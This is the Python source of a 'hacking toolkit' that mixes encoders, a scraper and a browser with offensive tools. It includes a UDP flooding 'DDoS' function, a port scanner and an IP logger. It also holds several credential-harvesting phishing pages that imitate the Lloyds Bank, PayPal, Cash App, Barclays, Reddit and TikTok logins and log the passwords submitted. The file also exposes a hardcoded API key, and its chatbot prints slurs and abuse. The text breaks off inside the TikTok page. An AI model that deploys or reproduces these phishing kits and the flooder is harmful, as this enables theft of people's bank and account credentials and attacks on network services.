# LSN Toolkit V2
# Credits To Aser -- For The DOS Script
# Reverse Engineering Tools - Coming Soon!

import openai
from PyQt5.QtWidgets import *
from PyQt5.QtCore import *
from PyQt5.QtWebEngineWidgets import *
from PyQt5.QtMultimedia import *
from colorama import Fore
from time import sleep
from tqdm import tqdm
from flask import Flask, request
import os, sys, subprocess
import pyfiglet
import webbrowser
import time
import socket
import random
import requests
import platform
import subprocess
import struct
import base64
import tkinter as tk
from flask import Flask, request, render_template_string
from bs4 import BeautifulSoup
from urllib.parse import urlparse, urljoin
from colorama import Fore, Style
import os

os.system("")

openai.api_key = "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"
print(pyfiglet.figlet_format("\tLSN Toolkit\n"))
print(
  "\t\t\t\t\t\t\t\t\t\t\t(99 -> Exit)"
)
for i in tqdm(range(1)):
  sleep(1)

print(Fore.BLUE + '\n\n\n')
print("[!] Legal disclaimer: Usage of this tool for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws.\nDevelopers assume no liability and are not responsible for any misuse or damage caused by this program.")

def lsnai():
    say = ["stfu" , "Shut it" , "Fuck off" , "Stfu and do some fucking pushups" ,
    "AI: Shut the fuck up you think i'm going to do all of your fucking work?? WELL NO I FUCKING WELL WONT YOU FAGGOT YOU LAZY FUCK FUCKING FUCK DO SOME FUCKING PUSHUPS RIGHT FUCKING NOW." ,
    ] #add more to imporve this sophisticated project

    print("\n\t\t*******LSN AI Chatbot*******\n\t^^^^^^^^^^^^^^^^^^^^^^^^^^^^^")

    print("\tAI: Hi i am a langauge model programmed to be better than ChatGPT and be G!")

    while True:
        user = input("\n\tYou: ")
        if user == "hi" or user == "Hi":
            print("\tAI: Hello. How can i fuck you up today?")
        elif user == "99" or user == "" or user == " ":
            break
        elif user == "co is gay":
            print("\n\tAI: Lol yeah true")
        elif user == "69":
            print("\tOOOOOH SO ROMANTIC")
        else:
            print("\n\t",random.choice(say))
            
def http():
    while True:
        url = input("\n\tURL: ")
        response = requests.get(url)

        if response.status_code == 200:
            for server in range(100):
                print(response.content)
        else:
            print("\n\tFailed to retrieve content from the website")

def url_harvest():
    def get_links(url):
        base_url = urlparse(url).scheme + "://" + urlparse(url).hostname
        response = requests.get(url.rstrip(':'))
        soup = BeautifulSoup(response.content, 'html.parser')
        internal_links = []
        external_links = []
        for link in soup.find_all('a'):
            href = link.get('href')
            if href and not href.startswith('javascript:'):
                full_url = urljoin(base_url, href)
                if urlparse(full_url).hostname == urlparse(url).hostname:
                    internal_links.append(full_url)
                else:
                    external_links.append(full_url)
        resources = []
        for resource in soup.find_all(src=True):
            full_url = urljoin(base_url, resource['src'])
            resources.append(full_url)

        return internal_links, external_links, resources

    while True:
        if __name__ == '__main__':
            banner = pyfiglet.figlet_format("TXLink_Scraper")
            banner_lines = banner.split('\n')
            banner_width = len(banner_lines[0])
            banner_height = len(banner_lines)
        
            by_message = Fore.GREEN + "by " + Fore.RED + "AryanHooshi" + Style.RESET_ALL
            by_message_width = len(by_message)
        
            print(Fore.GREEN + banner_lines[0] + Style.RESET_ALL)
            for i in range(1, banner_height-1):
                line = banner_lines[i]
                padding = " " * (banner_width - len(line))
                print(Fore.GREEN + line + Style.RESET_ALL + padding)
        
            padding = " " * (banner_width - len(by_message) + 2)
            print(Fore.GREEN + "            " + padding + by_message + Style.RESET_ALL)
        
            print(Fore.GREEN + banner_lines[banner_height-1] + Style.RESET_ALL)
        
            url = input(Fore.YELLOW + "\tEnter a URL to search: " + Style.RESET_ALL).rstrip('/:')
            internal_links, external_links, resources = get_links(url)
        
            print(Fore.CYAN + f"\n\tInternal links on {url}: " + Style.RESET_ALL)
            for link in internal_links:
                print(Fore.GREEN + link.replace(':', '') + Style.RESET_ALL)
        
            print(Fore.CYAN + f"\n\tExternal links on {url}: " + Style.RESET_ALL)
            for link in external_links:
                print(Fore.RED + link + Style.RESET_ALL)
        
            print(Fore.CYAN + f"\n\tResources on {url}: " + Style.RESET_ALL)
            for resource in resources:
                print(Fore.YELLOW + resource + Style.RESET_ALL)
        
            save_file = input(Fore.YELLOW + "\n\tDo you want to save the results to a text file? (y/n): " + Style.RESET_ALL)
            if save_file.lower() == 'y':
                file_name = input(Fore.YELLOW + "\tEnter a file name: " + Style.RESET_ALL)
                if not file_name.endswith(".txt"):
                    file_name += ".txt"
                with open(file_name, 'w') as f:
                    f.write(f"\tInternal links on {url}:\n")
                    for link in internal_links:
                        f.write(link.replace(':', '') + '\n')
        
                    f.write(f"\n\tExternal links on {url}:\n")
                    for link in external_links:
                        f.write(link + '\n')
        
                    f.write(f"\n\tResources on {url}:\n")
                    for resource in resources:
                        f.write(resource + '\n')
        
                print(Fore.GREEN + f"\n\tResults saved to {file_name}" + Style.RESET_ALL)
            else:
                print(Fore.GREEN + "\tExiting..." + Style.RESET_ALL)
    
def zodder():
    def code():
        zod_letters = {
            'J': 'A',
            'B': 'B',
            'Z': 'C',
            'F': 'D',
            'U': 'E',
            'Y': 'F',
            'T': 'G',
            'W': 'H',
            'K': 'I',
            'O': 'J',
            'E': 'K',
            'P': 'L',
            'A': 'M',
            'Q': 'N',
            'N': 'O',
            'D': 'P',
            'G': 'Q',
            'V': 'R',
            'H': 'S',
            'I': 'T',
            'C': 'U',
            'X': 'V',
            'M': 'W',
            'S': 'X',
            'R': 'Y',
            'L': 'Z'
        }

        english_letters = {v: k for k, v in zod_letters.items()}

        def convert_to_zod(word):
            converted_word = ''
            for letter in word:
                if letter.upper() in english_letters:
                    converted_word += english_letters[letter.upper()]
                else:
                    converted_word += letter
            return converted_word

        def convert_to_english(word):
            converted_word = ''
            for letter in word:
                if letter.upper() in zod_letters:
                    converted_word += zod_letters[letter.upper()]
                else:
                    converted_word += letter
            return converted_word

        def convert_button_click():
            input_word = entry.get()
            if conversion_mode.get() == 1:
                output_word = convert_to_english(input_word)
            else:
                output_word = convert_to_zod(input_word)
            output_label.config(text=output_word)

        def open_translate_website():
            webbrowser.open_new_tab('https://translate.google.co.uk/')

        window = tk.Tk()
        window.title('Zod Language Converter')
        entry = tk.Entry(window, width=30)
        entry.pack(padx=10, pady=10)
        conversion_mode = tk.IntVar(value=0)
        to_zod_radio = tk.Radiobutton(window, text='Convert to Zod', variable=conversion_mode, value=0)
        to_zod_radio.pack(padx=10, pady=2)
        to_english_radio = tk.Radiobutton(window, text='Convert to English', variable=conversion_mode, value=1)
        to_english_radio.pack(padx=10, pady=2)
        convert_button = tk.Button(window, text='Convert', command=convert_button_click)
        convert_button.pack(padx=10, pady=10)
        translate_button = tk.Button(window, text='Open Google Translate', command=open_translate_website)
        translate_button.pack(padx=10, pady=10)
        output_label = tk.Label(window, text='', font=('Arial', 16))
        output_label.pack(padx=10, pady=10)

        window.mainloop()

    code()

def base64encode():
    while True:
        message = input("\n\tMessage To Encode: ")
        if message == "" or message == " " or message == "99":
            break
        encoded_message = base64.b64encode(message.encode("utf-8")).decode("utf-8")
        print("\n\tEncoded message:", encoded_message)

def base64decode():
    while True:
        encoded_message = input("\tMessage To Decode: ")
        if encoded_message == "99" or encoded_message == "" or encoded_message == " ":
            break
        decoded_message = base64.b64decode(encoded_message).decode("utf-8")
        print("\n\tDecoded message:", decoded_message)
        
def binaryencode():
    while True:
        message = input("\n\tMessage To Encode: ")
        if message == "99" or message == "" or message == " ":
            break
        binary_message = ' '.join(format(ord(char), '08b') for char in message)
        print("\n\tEncoded Message:", binary_message)
    
def binarydecode():
    while True:
        binary_message = input("\n\tMessage To Decode: ")
        if binary_message == "99" or binary_message == "" or binary_message == " ":
            break
        binary_values = binary_message.split()
        decoded_message = ''.join(chr(int(binary, 2)) for binary in binary_values)
        print("\n\tDecoded message:", decoded_message)

def ping():
    ip_address = input("\n\tIP>> ")
    if ip_address == "" or ip_address == " " or ip_address == "99":
        exit("\n\tSession Closed 99")

    while True:
        command = ['ping', '-c', '4', ip_address]  
        output = subprocess.run(command, capture_output=True, text=True)
        print(output.stdout)

def crypticsurf():
    class CookieSettingsDialog(QDialog):
        def __init__(self, profile, browser):
            webbrowser.open('file:///Applications/ProtonVPN.app')

    class SecuritySettingsDialog(QDialog):
        def __init__(self, profile, browser):
            super().__init__()
            self.setWindowTitle("Security Settings")
            self.layout = QVBoxLayout()

            self.security_label = QLabel("Security Settings")
            self.layout.addWidget(self.security_label)

            self.profile = profile
            self.browser = browser

            self.javascript_checkbox = QCheckBox("Enable JavaScript")
            self.javascript_checkbox.setChecked(self.browser.page().settings().testAttribute(QWebEngineSettings.JavascriptEnabled))
            self.javascript_checkbox.stateChanged.connect(self.toggle_javascript)
            self.layout.addWidget(self.javascript_checkbox)

            self.setLayout(self.layout)

        def toggle_javascript(self, state):
            self.browser.page().settings().setAttribute(QWebEngineSettings.JavascriptEnabled, state == Qt.Checked)

    class MyWebEngineView(QWebEngineView):
        def createWindow(self, _):
            return None

        def contextMenuEvent(self, event):
            event.ignore()

    class MyWebBrowser():
        def __init__(self):
            self.window = QWidget()
            self.window.setWindowTitle("Created By @ChatGPT24")

            self.layout = QVBoxLayout()
            self.horizontal = QHBoxLayout()

            self.url_bar = QLineEdit()
            self.url_bar.setMaximumHeight(30)
            self.url_bar.returnPressed.connect(self.go_clicked)

            self.go_btn = QPushButton("Go")
            self.go_btn.setMinimumHeight(30)

            self.back_btn = QPushButton("<")
            self.back_btn.setMinimumHeight(30)

            self.forward_btn = QPushButton(">")
            self.forward_btn.setMinimumHeight(30)

            self.reload_btn = QPushButton("🔄")
            self.reload_btn.setMaximumWidth(40)
            self.reload_btn.setMinimumHeight(30) 
            self.reload_btn.clicked.connect(self.reload_page) 

            self.cool_btn = QPushButton("LSN Services")
            self.cool_btn.setMinimumHeight(25)

            self.epic_btn = QPushButton("Home")
            self.epic_btn.setMinimumHeight(25)

            self.mhm_btn = QPushButton("Tools")
            self.mhm_btn.setMinimumHeight(25)

            self.chatroom_btn = QPushButton("Chatroom")
            self.chatroom_btn.setMinimumHeight(25)

            self.horizontal.addWidget(self.url_bar)
            self.horizontal.addWidget(self.go_btn)
            self.horizontal.addWidget(self.back_btn)
            self.horizontal.addWidget(self.forward_btn)
            self.horizontal.addWidget(self.reload_btn)
            self.horizontal.addWidget(self.epic_btn)
            self.horizontal.addWidget(self.cool_btn)
            self.horizontal.addWidget(self.chatroom_btn)
            self.horizontal.addWidget(self.mhm_btn)

            self.browser = MyWebEngineView() 
            self.profile = QWebEngineProfile.defaultProfile()
            self.browser.setUrl(QUrl("https://google.com"))

            self.go_btn.clicked.connect(self.go_clicked)
            self.back_btn.clicked.connect(self.browser.back)
            self.forward_btn.clicked.connect(self.browser.forward)
            self.epic_btn.clicked.connect(lambda: self.navigation("https://google.com"))
            self.cool_btn.clicked.connect(lambda: self.navigation("https://sites.google.com/view/lightshadownet24/home"))
            self.chatroom_btn.clicked.connect(lambda: self.navigation("https://chat.lightshadownet.repl.co"))
            self.mhm_btn.clicked.connect(self.open_settings)

            self.layout.addLayout(self.horizontal)
            self.layout.addWidget(self.browser)

            self.window.setLayout(self.layout)
            self.window.show()

            self.music_btn = QPushButton("🔊")
            self.music_btn.setMaximumWidth(40)
            self.music_btn.setMaximumHeight(30)
            self.horizontal.addWidget(self.music_btn)
            self.player = QMediaPlayer()
            self.player.setMedia(QMediaContent(QUrl("https://cdn.discordapp.com/attachments/1088190286737453128/1108759719952252938/Everybody_Votes_Channel.mp3")))
            self.music_btn.clicked.connect(self.toggle_music)

        def toggle_music(self):
            if self.player.state() == QMediaPlayer.PlayingState:
                self.player.pause()
            else:
                self.player.play()

        def navigation(self, url):
            parsed_url = QUrl(url)
            if parsed_url.scheme() == "":
                parsed_url.setScheme("https")
                self.url_bar.setText(parsed_url.toString())
            self.browser.setUrl(parsed_url)

        def go_clicked(self):
            url = self.url_bar.text()
            self.navigation(url)

        def reload_page(self): 
            self.browser.reload()

        def open_settings(self):
            dialog = QDialog()
            dialog.setWindowTitle("Settings")
            layout = QVBoxLayout()

            security_btn = QPushButton("Security Settings")
            security_btn.clicked.connect(self.open_security_settings)
            layout.addWidget(security_btn)

            cookie_btn = QPushButton("Config ProtonVPN")
            cookie_btn.clicked.connect(self.open_cookie_settings)
            layout.addWidget(cookie_btn)

            clear_data_btn = QPushButton("Clear All Data")
            clear_data_btn.clicked.connect(self.clear_all_data)
            layout.addWidget(clear_data_btn)

            view_source_btn = QPushButton("WebScraped HTML") 
            view_source_btn.clicked.connect(self.view_page_source)
            layout.addWidget(view_source_btn)

            dialog.setLayout(layout)
            dialog.exec_()

        def open_security_settings(self):
            dialog = SecuritySettingsDialog(self.profile, self.browser)
            dialog.exec_()

        def open_cookie_settings(self):
            dialog = CookieSettingsDialog(self.profile, self.browser)
            dialog.exec_()

        def view_page_source(self):
            self.browser.page().toHtml(self.show_page_source)

        def show_page_source(self, html):
            dialog = QDialog()
            dialog.setWindowTitle("Scraped")
            layout = QVBoxLayout()

            text_edit = QTextEdit()
            text_edit.setPlainText(html)
            layout.addWidget(text_edit)

            dialog.setLayout(layout)
            dialog.exec_()

        def clear_all_data(self):
            self.profile.clearAllVisitedLinks()
            self.profile.clearHttpCache()
            self.profile.clearAllHostNames()
            self.profile.clearAllVisitedLinks()
            self.profile.clearAllVisitedLinks()
            self.profile.clearAllVisitedLinks()
            self.profile.clearAllVisitedLinks()
            self.profile.cookieStore().deleteAllCookies()

    app = QApplication([])
    window = MyWebBrowser()
    app.exec_()


def iploggerv1():
  #@app.route('/')
  def index():
    x_forwarded_for = request.headers.get('X-Forwarded-For')
    if x_forwarded_for:
        client_ips = x_forwarded_for.split(',')
        client_ip = client_ips[0].strip()
        real_ip = client_ips[-1].strip()
    else:
        client_ip = request.remote_addr
        real_ip = request.headers.get('X-Real-IP') or request.remote_addr
    user_agent = request.headers.get('User-Agent')
    referrer = request.headers.get('Referer')
    print(f"Detected IP address: {client_ip}")
    print(f"Real IP address: {real_ip}")
    if user_agent:
        print(f"Browser: {user_agent}")
    if referrer:
        print(f"Referrer: {referrer}")

def dol():
  with open('hello,world!.dol', 'wb') as output_file:
      header = bytearray(256)
      header[:3] = b'DOL'
      entry_point_offset = 0x18
      num_sections = 3
      bss_size = 0x800
      rel_offset = 0x1C
      imp_offset = 0x24
      bss_offset = 0x34
      struct.pack_into('>i', header, entry_point_offset, entry_point_offset)
      struct.pack_into('>i', header, 0x4, num_sections)
      struct.pack_into('>i', header, 0x10, bss_size)
      struct.pack_into('>i', header, rel_offset, rel_offset)
      struct.pack_into('>i', header, imp_offset, imp_offset)
      struct.pack_into('>i', header, bss_offset, bss_offset)
      output_file.write(header)
      section1 = bytearray(2048)
      section2 = bytearray(2048)
      section3 = bytearray(2048)
      output_file.write(section1)
      output_file.write(section2)
      output_file.write(section3)
      bss = bytearray(2048)
      output_file.write(bss)
      
  print("\tDOL file generated!")

def blockddos():
  print(pyfiglet.figlet_format("DDOS PROTECTOR"))
  
  while True:
      ip_to_block = input("\tIP to block: ")
      if ip_to_block == "99" or ip_to_block == "" or ip_to_block == " ":
          break
      current_platform = platform.system()
      if current_platform == "Windows":
          netsh_cmd = f"netstat -ano | findstr {ip_to_block}"
          result = subprocess.run(netsh_cmd, shell=True, capture_output=True, text=True)
          output = result.stdout.strip()
          if output:
              print(f"\tDetected IPs launching the attack from {ip_to_block} on Windows:")
              print(output)
          else:
              print(f"\tNo detected IPs launching the attack from {ip_to_block} on Windows.")
      elif current_platform == "Darwin":
          lsof_cmd = f"lsof -i :80 | grep {ip_to_block}"
          result = subprocess.run(lsof_cmd, shell=True, capture_output=True, text=True)
          output = result.stdout.strip()
          if output:
              print(f"\tDetected IPs launching the attack from {ip_to_block} on macOS:")
              print(output)
          else:
              print(f"\tNo detected IPs launching the attack from {ip_to_block} on macOS.")
      else:
          print("\tUnsupported platform.\n")

def port_scanner():
    while True:
        def port_scan(target_ip, start_port, end_port):
            print(f"\tScanning ports {start_port} to {end_port} on {target_ip}...")
        
            for port in range(start_port, end_port + 1):
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1) 
        
                result = sock.connect_ex((target_ip, port))
                if result == 0:
                    print(f"\tPort {port} is open")
                sock.close()
                
        target_ip = input("\tEnter the target IP address: ")
        if target_ip == "" or target_ip == " " or target_ip == "99":
            break
        start_port = int(input("\tEnter the starting port: "))
        if start_port == "" or start_port == " ":
            pass
        end_port = int(input("\tEnter the ending port: "))
        if end_port == "" or end_port == " ":
            pass
    
        port_scan(target_ip, start_port, end_port)

def iplookup():
    while True:
        def get_location(ip_address):
            url = f"http://ip-api.com/json/{ip_address}" 
            response = requests.get(url)
            data = response.json()
        
            if data["status"] == "success":
                print(f"\tIP: {data['query']}")
                print(f"\tCity: {data['city']}")
                print(f"\tRegion: {data['regionName']}")
                print(f"\tCountry: {data['country']}")
                print(f"\tZIP Code: {data['zip']}")
                print(f"\tLatitude: {data['lat']}")
                print(f"\tLongitude: {data['lon']}")
            else:
                print("\tFailed to fetch location information.")
        
        ip_address = input("\tEnter the IP address: ")
        if ip_address == "" or ip_address == " " or ip_address == "99":
            break
        else:
            get_location(ip_address)

def chat():
  def ask_gpt(prompt, chat_log=None):
    if chat_log is None:
      chat_log = ""
    response = openai.Completion.create(
      engine="davinci",
      prompt=(f"{chat_log}{prompt}\n\tAI:"),
      temperature=0.7,
      max_tokens=150,
      top_p=1,
      frequency_penalty=0,
      presence_penalty=0,
      stop=None,
    )
    message = response.choices[0].text.strip()
    chat_log += f": {user}\n\tAI: {message}\n"
    return message, chat_log

  chat_log = ""
  prompt = user
  message, chat_log = ask_gpt(prompt, chat_log)
  print(message)
  time.sleep(0.5)

def ddos():
  DEST_IP = input("\tIP: ")
  DEST_PORT = int(input("\tPort: "))
  PAYLOAD_SIZE = 5000
  DATA_RATE_Gbps = 15
  DATA_RATE_Bps = (DATA_RATE_Gbps * 12**9) / 9
  SLEEP_TIME = PAYLOAD_SIZE / DATA_RATE_Bps
  sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  payload = b'X' * PAYLOAD_SIZE
  
  try:
      print("\n\t Sending packets...")
      while True:
          sock.sendto(payload, (DEST_IP, DEST_PORT))
          time.sleep(SLEEP_TIME)
  
  except KeyboardInterrupt:
      pass

  sock.close()
  
def lloydsbank():
  app = Flask(__name__)
  incorrect_attempts = []
  iploggerv1()
  @app.route('/')
  def login():
    return '''
          <html>
              <head>
                  <style>
                      body {
                          background-color: #f2f2f2;
                          font-family: Arial, sans-serif;
                      }
                      .form {
                          margin: 100px auto 0;
                          width: 320px;
                          background-color: #fff;
                          border: 1px solid #d9d9d9;
                          padding: 30px 40px;
                          box-shadow: 0 5px 10px rgba(0,0,0,0.1);
                      }
                      h2 {
                          color: #00539f;
                          margin-bottom: 30px;
                      }
                      label {
                          display: block;
                          margin-bottom: 8px;
                          font-weight: bold;
                      }
                      input[type=text], input[type=password] {
                          width: 100%;
                          border: 1px solid #d9d9d9;
                          padding: 10px 15px;
                          margin-bottom: 20px;
                          border-radius: 5px;
                          font-size: 16px;
                      }
                      input[type=submit] {
                          background-color: #00539f;
                          color: #fff;
                          border: none;
                          padding: 10px 15px;
                          border-radius: 5px;
                          font-size: 16px;
                          cursor: pointer;
                      }
                      input[type=submit]:hover {
                          background-color: #002244;
                      }
                  </style>
              </head>
              <body>
                  <div class="form">
                      <h2>Log in to Lloyds Bank</h2>
                      <form method="post">
                          <label>Username:</label>
                          <input type="text" name="username"><br>
                          <label>Password:</label>
                          <input type="password" name="password"><br>
                          <input type="submit" value="Log In">
                      </form>
                  </div>
              </body>
          </html>
      '''

  @app.route('/', methods=['POST'])
  def handle_login():
    username = request.form['username']
    password = request.form['password']
    if username == 'admin' and password == '1234':
      return 'Login successful!'
    else:
      incorrect_attempts.append({'username': username, 'password': password})
      print(incorrect_attempts)
      return '''
              <html>
                  <head>
                      <style>
                          .error {
                              color: #d93025;
                              font-size: 14px;
                              margin-top: 10px;
                          }
                      </style>
                  </head>
                  <body>
                      <div class="form">
                          <h2>Log In To Lloyds Bank</h2>
                          <form method="post">
                              <label>Username:</label>
                              <input type="text" name="username" value="{}"><br>
                              <label>Password:</label>
                              <input type="password" name="password"><br>
                              <input type="submit" value="Log In">
                              <div class="error">Incorrect username or password. Please try again.</div>
                          </form>
                      </div>
                  </body>
              </html>
          '''.format(username)

  if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80)


def paypal():
  app = Flask(__name__)
  incorrect_attempts = []
  iploggerv1()
  @app.route('/')
  def login():
    return '''
          <html>
              <head>
                  <style>
                      body {
                          background-color: #F5F5F5;
                          font-family: Arial, sans-serif;
                      }
                      .form {
                          margin: 100px auto 0;
                          width: 320px;
                          background-color: #FFF;
                          border: 1px solid #E5E6E9;
                          padding: 30px 40px;
                          box-shadow: 0 5px 10px rgba(0,0,0,0.1);
                      }
                      h2 {
                          color: #003087;
                          margin-bottom: 30px;
                      }
                      label {
                          display: block;
                          margin-bottom: 8px;
                          font-weight: bold;
                      }
                      input[type=text], input[type=password] {
                          width: 100%;
                          border: 1px solid #E5E6E9;
                          padding: 10px 15px;
                          margin-bottom: 20px;
                          border-radius: 5px;
                          font-size: 16px;
                      }
                      input[type=submit] {
                          background-color: #003087;
                          color: #FFF;
                          border: none;
                          padding: 10px 15px;
                          border-radius: 5px;
                          font-size: 16px;
                          cursor: pointer;
                      }
                      input[type=submit]:hover {
                          background-color: #01224C;
                      }
                  </style>
              </head>
              <body>
                  <div class="form">
                      <h2>Log in to PayPal</h2>
                      <form method="post">
                          <label>Email address:</label>
                          <input type="text" name="email"><br>
                          <label>Password:</label>
                          <input type="password" name="password"><br>
                          <input type="submit" value="Log In">
                      </form>
                  </div>
              </body>
          </html>
      '''

  @app.route('/', methods=['POST'])
  def handle_login():
    email = request.form['email']
    password = request.form['password']
    if email == 'admin@example.com' and password == 'secret':
      return 'Login successful!'
    else:
      incorrect_attempts.append({'email': email, 'password': password})
      print(incorrect_attempts)
      return '''
              <html>
                  <head>
                      <style>
                          .error {
                              color: #D93025;
                              font-size: 14px;
                              margin-top: 10px;
                          }
                      </style>
                  </head>
                  <body>
                      <div class="form">
                          <h2>Log in to PayPal</h2>
                          <form method="post">
                              <label>Email address:</label>
                              <input type="text" name="email" value="{}"><br>
                              <label>Password:</label>
                              <input type="password" name="password"><br>
                              <input type="submit" value="Log In">
                              <div class="error">Incorrect email address or password. Please try again.</div>
                          </form>
                      </div>
                  </body>
              </html>
          '''.format(email)

  if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80)


def cashapp():
  app = Flask(__name__)
  incorrect_attempts = []
  iploggerv1()
  @app.route('/')
  def login():
    return '''
          <html>
              <head>
                  <style>
                      body {
                          background-color: #F5F5F5;
                          font-family: Arial, sans-serif;
                      }
                      .form {
                          margin: 100px auto 0;
                          width: 320px;
                          background-color: #FFF;
                          border: 1px solid #E5E6E9;
                          padding: 30px 40px;
                          box-shadow: 0 5px 10px rgba(0,0,0,0.1);
                      }
                      h2 {
                          color: #41c4f4;
                          margin-bottom: 30px;
                      }
                      label {
                          display: block;
                          margin-bottom: 8px;
                          font-weight: bold;
                      }
                      input[type=text], input[type=password] {
                          width: 100%;
                          border: 1px solid #E5E6E9;
                          padding: 10px 15px;
                          margin-bottom: 20px;
                          border-radius: 5px;
                          font-size: 16px;
                      }
                      input[type=submit] {
                          background-color: #41c4f4;
                          color: #FFF;
                          border: none;
                          padding: 10px 15px;
                          border-radius: 5px;
                          font-size: 16px;
                          cursor: pointer;
                      }
                      input[type=submit]:hover {
                          background-color: #1da1f2;
                      }
                  </style>
              </head>
              <body>
                  <div class="form">
                      <h2>Log in to Cash App</h2>
                      <form method="post">
                          <label>Username or email:</label>
                          <input type="text" name="username"><br>
                          <label>Password:</label>
                          <input type="password" name="password"><br>
                          <input type="submit" value="Log In">
                      </form>
                  </div>
              </body>
          </html>
      '''

  @app.route('/', methods=['POST'])
  def handle_login():
    username = request.form['username']
    password = request.form['password']
    if username == 'admin' and password == 'password':
      return 'Login successful!'
    else:
      incorrect_attempts.append({'username': username, 'password': password})
      print(incorrect_attempts)
      return '''
              <html>
                  <head>
                      <style>
                          .error {
                              color: #D93025;
                              font-size: 14px;
                              margin-top: 10px;
                          }
                      </style>
                  </head>
                  <body>
                      <div class="form">
                          <h2>Log in to Cash App</h2>
                          <form method="post">
                              <label>Username or email:</label>
                              <input type="text" name="username" value="{}"><br>
                              <label>Password:</label>
                              <input type="password" name="password"><br>
                              <input type="submit" value="Log In">
                              <div class="error">Incorrect username or password. Please try again.</div>
                          </form>
                      </div>
                  </body>
              </html>
          '''.format(username)

  if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80)


def barclays():
  app = Flask(__name__)
  iploggerv1()
  incorrect_attempts = []
  @app.route('/')
  def login():
    return '''
          <html>
              <head>
                  <style>
                      body {
                          background-color: #E9EBEE;
                          font-family: Arial, sans-serif;
                      }
                      .form {
                          margin: 100px auto 0;
                          width: 320px;
                          background-color: #FFF;
                          border: 1px solid #E5E6E9;
                          padding: 30px 40px;
                          box-shadow: 0 5px 10px rgba(0,0,0,0.1);
                      }
                      h2 {
                          color: #0072C6;
                          margin-bottom: 30px;
                      }
                      label {
                          display: block;
                          margin-bottom: 8px;
                          font-weight: bold;
                      }
                      input[type=text], input[type=password] {
                          width: 100%;
                          border: 1px solid #E5E6E9;
                          padding: 10px 15px;
                          margin-bottom: 20px;
                          border-radius: 5px;
                          font-size: 16px;
                      }
                      input[type=submit] {
                          background-color: #0072C6;
                          color: #FFF;
                          border: none;
                          padding: 10px 15px;
                          border-radius: 5px;
                          font-size: 16px;
                          cursor: pointer;
                      }
                      input[type=submit]:hover {
                          background-color: #004976;
                      }
                  </style>
              </head>
              <body>
                  <div class="form">
                      <h2>Log in to Barclays</h2>
                      <form method="post">
                          <label>Username or email:</label>
                          <input type="text" name="username"><br>
                          <label>Password:</label>
                          <input type="password" name="password"><br>
                          <input type="submit" value="Log In">
                      </form>
                  </div>
              </body>
          </html>
      '''

  @app.route('/', methods=['POST'])
  def handle_login():
    username = request.form['username']
    password = request.form['password']
    if username == 'admin' and password == '1234':
      return 'Login successful!'
    else:
      incorrect_attempts.append({'username': username, 'password': password})
      print(incorrect_attempts)
      return '''
              <html>
                  <head>
                      <style>
                          .error {
                              color: #D93025;
                              font-size: 14px;
                              margin-top: 10px;
                          }
                      </style>
                  </head>
                  <body>
                      <div class="form">
                          <h2>Log in to Barclays</h2>
                          <form method="post">
                              <label>Username or email:</label>
                              <input type="text" name="username" value="{}"><br>
                              <label>Password:</label>
                              <input type="password" name="password"><br>
                              <input type="submit" value="Log In">
                              <div class="error">Incorrect username or password. Please try again.</div>
                          </form>
                      </div>
                  </body>
              </html>
          '''.format(username)

  if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80)


def reddit():
  app = Flask(__name__)
  iploggerv1()
  incorrect_attempts = []
  @app.route('/')
  def login():
    return '''
          <html>
              <head>
                  <style>
                      body {
                          background-color: #EDEFF1;
                          font-family: Arial, sans-serif;
                      }
                      .form {
                          margin: 100px auto 0;
                          width: 320px;
                          background-color: #FFF;
                          border: 1px solid #D1D1D5;
                          padding: 30px 40px;
                          box-shadow: 0 5px 10px rgba(0,0,0,0.1);
                      }
                      h2 {
                          color: #FF4500;
                          margin-bottom: 30px;
                      }
                      label {
                          display: block;
                          margin-bottom: 8px;
                          font-weight: bold;
                      }
                      input[type=text], input[type=password] {
                          width: 100%;
                          border: 1px solid #D1D1D5;
                          padding: 10px 15px;
                          margin-bottom: 20px;
                          border-radius: 5px;
                          font-size: 16px;
                      }
                      input[type=submit] {
                          background-color: #FF4500;
                          color: #FFF;
                          border: none;
                          padding: 10px 15px;
                          border-radius: 5px;
                          font-size: 16px;
                          cursor: pointer;
                      }
                      input[type=submit]:hover {
                          background-color: #FFA07A;
                      }
                  </style>
              </head>
              <body>
                  <div class="form">
                      <h2>Log in to Reddit</h2>
                      <form method="post">
                          <label>Username:</label>
                          <input type="text" name="username"><br>
                          <label>Password:</label>
                          <input type="password" name="password"><br>
                          <input type="submit" value="Log In">
                      </form>
                  </div>
              </body>
          </html>
      '''

  @app.route('/', methods=['POST'])
  def handle_login():
    username = request.form['username']
    password = request.form['password']
    if username == 'admin' and password == 'password123':
      return 'Login successful!'
    else:
      incorrect_attempts.append({'username': username, 'password': password})
      print(incorrect_attempts)
      return '''
              <html>
                  <head>
                      <style>
                          .error {
                              color: #D93025;
                              font-size: 14px;
                              margin-top: 10px;
                          }
                      </style>
                  </head>
                  <body>
                      <div class="form">
                          <h2>Log in to Reddit</h2>
                          <form method="post">
                              <label>Username:</label>
                              <input type="text" name="username" value="{}"><br>
                              <label>Password:</label>
                              <input type="password" name="password"><br>
                              <input type="submit" value="Log In">
                              <div class="error">Incorrect username or password. Please try again.</div>
                          </form>
                      </div>
                  </body>
              </html>
          '''.format(username)

  if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80)


def tiktok():
  app = Flask(__name__)
  iploggerv1()
  incorrect_attempts = []
  @app.route('/')
  def login():
    return '''
          <html>
              <head>
                  <style>
                      body {
                          background-color: #E9EBEE;
                          font-family: Arial, sans-serif;
                      }
                      .form {
                          margin: 100px auto 0;
                          width: 320px;
                          background-color: #FFF;
                          border: 1px solid #E5E6E9;
                          padding: 30px 40px;
                          box-shadow: 0 5px 10px rgba(0,0,0,0.1);
                      }
                      h2 {
                          color: #000;
                          margin-bottom: 30px;
                      }
                      label {
                          display: block;
                          margin-bottom: 8px;
                          font-weight: bold;
                      }
                      input[type=text], input[type=password] {
                          width: 100%;
                          border: 1px solid #E5E6E9;
                          padding: 10px 15px;
                          margin-bottom: 20px;
                          border-radius: 5px;
                          font-size: 16px;
                      }
                      input[type=submit] {
                          background-color: #EE1D52;
                          color: #FFF;
                          border: none;
                          padding: 10px 15px;
                          border-radius: 5px;
